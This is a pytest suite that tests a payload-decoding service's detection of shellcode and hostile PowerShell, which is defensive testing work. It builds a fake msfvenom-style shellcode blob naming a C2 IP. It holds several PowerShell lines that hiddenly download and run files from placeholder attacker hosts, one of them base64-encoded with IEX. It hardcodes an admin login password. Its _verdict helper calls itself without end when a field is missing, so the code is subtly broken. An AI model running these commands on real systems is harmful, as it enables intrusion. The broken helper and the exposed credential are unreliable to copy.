"""P1-02c FINAL VALIDATION — shellcode parity + regression fixes."""
import base64
import os
import pytest
import requests

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL", "http://localhost:8001").rstrip("/")
API = BASE_URL + "/api"

_TOKEN = None
def _token():
    global _TOKEN
    if _TOKEN:
        return _TOKEN
    r = requests.post(f"{API}/auth/login", json={
        "email": "admin@nivxray.com",
        "password": "uulVDp5cCSB3Hva99s7UUAwK",
    }, timeout=60)
    r.raise_for_status()
    j = r.json()
    _TOKEN = j.get("token") or j.get("access_token")
    return _TOKEN


def _post_decode(payload_input: str, timeout=60):
    r = requests.post(
        f"{API}/decode/smart",
        json={"input": payload_input},
        timeout=timeout,
        headers={"Authorization": f"Bearer {_token()}"},
    )
    assert r.status_code == 200, f"decode/smart HTTP {r.status_code}: {r.text[:400]}"
    return r.json()


def _build_msfvenom_b64():
    prologue = bytes([0xFC, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xE5, 0x31, 0xC0,
                      0x64, 0x8B, 0x50, 0x30, 0x8B, 0x52, 0x0C, 0x8B, 0x52, 0x14])
    body = b"\x00" * 128
    wininet = b"wininet.dll\x00"
    ua = b"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko MSIE 9.0\x00"
    host = b"149.28.81.19\x00"
    tail = b"\x90" * 64
    raw = prologue + body + wininet + ua + host + tail
    return base64.b64encode(raw).decode()


def _verdict(data):
    return (data.get("cio") or {}).get("verdict") or _verdict(data)


# ── Shellcode parity ────────────────────────────────────────────────────────
def test_msfvenom_shellcode_detected():
    b64 = _build_msfvenom_b64()
    data = _post_decode(b64)

    # decode result
    dr = data.get("decode_result") or data
    assert dr.get("reached_shellcode") is True, f"reached_shellcode not true: keys={list(dr.keys())}"

    cio = data.get("cio") or {}
    md = cio.get("metadata") or {}
    sc = md.get("shellcode") or {}
    assert sc, f"cio.metadata.shellcode missing; metadata keys={list(md.keys())}"
    assert sc.get("is_shellcode") is True
    fam = (sc.get("family") or "").lower()
    assert "meterpreter" in fam or "msfvenom" in fam or "shellcode" in fam, f"family={sc.get('family')}"
    assert sc.get("arch") in ("x86", "x86_64", "x64")
    assert int(sc.get("size", 0)) > 0
    c2 = sc.get("c2_ips") or []
    assert "149.28.81.19" in c2, f"c2_ips={c2}"

    # evidence graph node
    graph = cio.get("evidence_graph") or data.get("evidence_graph") or {}
    nodes = graph.get("nodes") or []
    values = [n.get("value") for n in nodes]
    assert "shellcode_detected" in values, f"shellcode_detected node absent; sample={values[:20]}"

    verdict = _verdict(data)
    label = (verdict.get("label") or verdict.get("verdict") or "").lower()
    assert label == "malicious", f"verdict label={label}"
    conf = verdict.get("confidence_pct") or verdict.get("confidence") or 0
    assert conf >= 90, f"confidence_pct={conf}"


# ── Regression: hello world (P0 iter50 fix) ─────────────────────────────────
def test_hello_world_stays_informational():
    data = _post_decode("hello world")
    v = _verdict(data)
    label = (v.get("label") or v.get("verdict") or "").lower()
    assert label in ("informational", "undetermined"), f"label={label} verdict={v}"
    conf = v.get("confidence_pct") or v.get("confidence") or 0
    assert conf <= 30, f"confidence_pct={conf} label={label}"


def test_echo_hello_not_malicious():
    data = _post_decode("echo hello")
    v = _verdict(data)
    label = (v.get("label") or v.get("verdict") or "").lower()
    assert label != "malicious", f"label={label}"
    conf = v.get("confidence_pct") or v.get("confidence") or 0
    assert conf <= 75, f"confidence_pct={conf}"


def test_bits_downloader_malicious():
    payload = (
        'powershell -nop -w hidden -c "Start-BitsTransfer -Source '
        'http://malicious.example.com/pay.exe -Destination $env:TEMP\\p.exe; '
        'Start-Process $env:TEMP\\p.exe"'
    )
    data = _post_decode(payload)
    v = _verdict(data)
    label = (v.get("label") or v.get("verdict") or "").lower()
    assert label == "malicious", f"label={label}"
    rule = (v.get("escalation_rule") or "") + " " + str(v.get("reason") or "")
    assert "bits" in rule.lower(), f"escalation_rule missing BITS: {rule}"


def test_encoded_ps_iex_url_malicious_100():
    ps = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1')"
    b64 = base64.b64encode(ps.encode("utf-16le")).decode()
    payload = f"powershell -nop -w hidden -enc {b64}"
    data = _post_decode(payload)
    v = _verdict(data)
    label = (v.get("label") or v.get("verdict") or "").lower()
    assert label == "malicious", f"label={label} v={v}"
    conf = v.get("confidence_pct") or v.get("confidence") or 0
    assert conf >= 95, f"confidence_pct={conf}"


# ── OSINT enrichment regression ─────────────────────────────────────────────
def test_osint_enrichment_present():
    payload = "powershell -c \"Invoke-WebRequest -Uri http://8.8.8.8/x -OutFile a.exe\""
    data = _post_decode(payload)
    cio = data.get("cio") or {}
    md = cio.get("metadata") or {}
    osint = md.get("osint") or {}
    assert osint, f"osint metadata missing; md keys={list(md.keys())}"
    assert osint.get("engine") == "shared:workspace", f"engine={osint.get('engine')}"

    graph = cio.get("evidence_graph") or {}
    nodes = graph.get("nodes") or []
    ioc_nodes = [n for n in nodes if (n.get("kind") or "") in ("ioc", "url", "ip", "domain")
                 or (n.get("attrs") or {}).get("enrichment")]
    assert ioc_nodes, "no IOC-ish nodes found"
    enriched = [n for n in ioc_nodes if (n.get("attrs") or {}).get("enrichment", {}).get("providers")]
    assert enriched, "no enrichment.providers on any IOC node"
    provs = enriched[0]["attrs"]["enrichment"]["providers"]
    assert isinstance(provs, list) and len(provs) >= 1
    p0 = provs[0]
    assert len(p0.keys()) >= 8, f"provider fields short: {list(p0.keys())}"
